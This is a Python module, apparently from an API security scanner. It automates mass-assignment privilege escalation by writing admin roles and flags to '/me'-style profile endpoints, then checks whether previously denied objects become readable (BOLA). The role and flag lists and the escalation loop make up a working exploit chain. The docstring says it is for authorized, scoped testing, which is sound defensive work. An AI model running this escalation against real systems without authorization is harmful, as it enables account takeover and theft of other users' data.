"""
core/cortex/escalation_amplification.py

Escalation-amplified BOLA — does privilege escalation EXPAND object access?

The plain BOLA classes ask "can principal A reach object B?". This asks the harder,
higher-impact question: "after A reaches role X through an unintended path, does
object access expand beyond what A could reach before?". That is where real systems
bleed, and it is invisible to single-shot checks because each request on its own
looks authorized.

Confirmation is a DENIED→ALLOWED differential across a privilege boundary the
attacker crossed themselves:

  1. As the low-priv baseline, record which candidate objects are DENIED (401/403).
  2. Escalate the SAME principal via profile-update mass assignment (PATCH/PUT a
     `/me`-style endpoint with a privileged role/flag the client must not set),
     confirming the role actually changed by re-reading the profile.
  3. Re-request the previously-denied objects as the now-escalated principal. Any
     that return 2xx with object data are AMPLIFIED: escalation expanded access.

A finding requires all three — objects denied at baseline, an escalation that
provably changed the role, and previously-denied objects now readable. If the
escalation is refused (a hardened `/me` rejecting role writes) there is no chain,
so a secure target stays silent. The engine tries several privileged values and
keeps the one that amplifies most.

`send` is injectable. Real exploitation — callers MUST gate it (active mode,
scope, authorized target).
"""

from __future__ import annotations

import logging
from dataclasses import dataclass, field
from typing import Any, Awaitable, Callable, Dict, List, Optional, Tuple

from core.wraith.bola_probe import _deep_get

logger = logging.getLogger(__name__)

Send = Callable[[str, str, Optional[Dict[str, Any]]], Awaitable[Tuple[int, Any]]]

# `/me`-style profile endpoints where a mass-assignable role often lives.
_PROFILE_ENDPOINTS = ["/api/users/me", "/users/v1/me", "/api/me", "/me",
                      "/account", "/api/account", "/profile", "/api/profile", "/user/me"]
_ROLE_FIELDS = ["role", "roles", "userRole", "user_role", "accountType", "account_type", "type"]
# Privileged role values to try, roughly most-to-least likely to widen access.
_PRIV_ROLE_VALUES = ["support_agent", "support", "admin", "administrator", "superadmin",
                     "super_admin", "platform_admin", "staff", "manager", "moderator", "operator"]
# Boolean privilege flags some apps honor on profile update.
_PRIV_FLAGS: List[Tuple[str, Any]] = [("isAdmin", True), ("is_admin", True), ("admin", True)]


@dataclass
class AmplificationResult:
    role_before: str
    role_after: str
    vector: str                       # how the escalation was performed
    baseline_denied: int              # # objects denied to the baseline principal
    amplified: List[Tuple[str, str]]  # (object_url, evidence) now readable post-escalation

    @property
    def count(self) -> int:
        return len(self.amplified)


@dataclass
class _Proof:
    role_before: str
    role_after: str
    vector: str


def _has_object_data(resp: Any) -> bool:
    if isinstance(resp, dict):
        return bool(resp.get("id") or resp.get("data") or len(resp) >= 2)
    return bool(resp)


def _tenant_hint(resp: Any) -> str:
    for k in ("tenant_id", "tenantId", "owner_user_id", "ownerId", "UserId", "owner"):
        v = _deep_get(resp, k)
        if v is not None:
            return f"{k}={v}"
    return "object data returned"


class _ProfileEscalator:
    """Discovered profile endpoint + role field; mutates the principal's own role."""

    def __init__(self, send: Send, origin: str, endpoint: str, role_field: str, original_role: str):
        self.send = send
        self.origin = origin
        self.endpoint = endpoint
        self.role_field = role_field
        self.original_role = original_role

    async def escalate(self, field_name: str, value: Any) -> Optional[_Proof]:
        url = self.origin + self.endpoint
        for method in ("PATCH", "PUT"):
            try:
                st, _ = await self.send(method, url, {field_name: value})
            except Exception:
                continue
            if not (200 <= int(st) < 300):
                continue
            try:
                st2, me = await self.send("GET", url, None)
            except Exception:
                continue
            if 200 <= int(st2) < 300 and str(_deep_get(me, field_name)) == str(value):
                return _Proof(self.original_role, str(value),
                              f"{method} {self.endpoint} {{{field_name}: {value!r}}}")
        return None


async def _make_profile_escalator(
    origin: str, send: Send, endpoints: List[str], role_fields: List[str],
) -> Optional[_ProfileEscalator]:
    for ep in endpoints:
        try:
            st, me = await send("GET", origin + ep, None)
        except Exception:
            continue
        if not (200 <= int(st) < 300) or not isinstance(me, dict):
            continue
        rf = next((f for f in role_fields if _deep_get(me, f) is not None), None)
        original = str(_deep_get(me, rf)) if rf else ""
        return _ProfileEscalator(send, origin, ep, rf or role_fields[0], original)
    return None


async def verify_escalation_amplifies_bola(
    origin: str,
    baseline_send: Send,
    *,
    candidate_refs: List[str],
    max_refs: int = 40,
    profile_endpoints: Optional[List[str]] = None,
    role_fields: Optional[List[str]] = None,
    role_values: Optional[List[str]] = None,
) -> Optional[AmplificationResult]:
    """Confirm escalation expands object access. Best-effort; None unless objects
    denied at baseline become readable after a profile-update escalation."""
    # 1. Record what the baseline principal is DENIED.
    denied: List[str] = []
    for ref in candidate_refs[:max_refs]:
        url = ref if ref.startswith("http") else origin + ref
        try:
            st, _ = await baseline_send("GET", url, None)
        except Exception:
            continue
        if int(st) in (401, 403):
            denied.append(url)
    if not denied:
        return None

    # 2. Discover a writable profile + escalate (mutates the SAME principal).
    escalator = await _make_profile_escalator(
        origin, baseline_send, profile_endpoints or _PROFILE_ENDPOINTS, role_fields or _ROLE_FIELDS)
    if escalator is None:
        return None

    attempts: List[Tuple[str, Any]] = [(escalator.role_field, v) for v in (role_values or _PRIV_ROLE_VALUES)]
    attempts += _PRIV_FLAGS

    best: Optional[AmplificationResult] = None
    for field_name, value in attempts:
        proof = await escalator.escalate(field_name, value)
        if proof is None or proof.role_after == escalator.original_role:
            continue                    # escalation refused or no real change
        amplified: List[Tuple[str, str]] = []
        for url in denied:
            try:
                st, resp = await baseline_send("GET", url, None)   # principal now escalated
            except Exception:
                continue
            if 200 <= int(st) < 300 and _has_object_data(resp):
                amplified.append((url, _tenant_hint(resp)))
        if amplified and (best is None or len(amplified) > best.count):
            best = AmplificationResult(
                role_before=escalator.original_role, role_after=proof.role_after,
                vector=proof.vector, baseline_denied=len(denied), amplified=amplified)
            logger.info("[escalation_amplification] %s→%s unlocked %d/%d denied object(s)",
                        escalator.original_role, proof.role_after, len(amplified), len(denied))
    return best
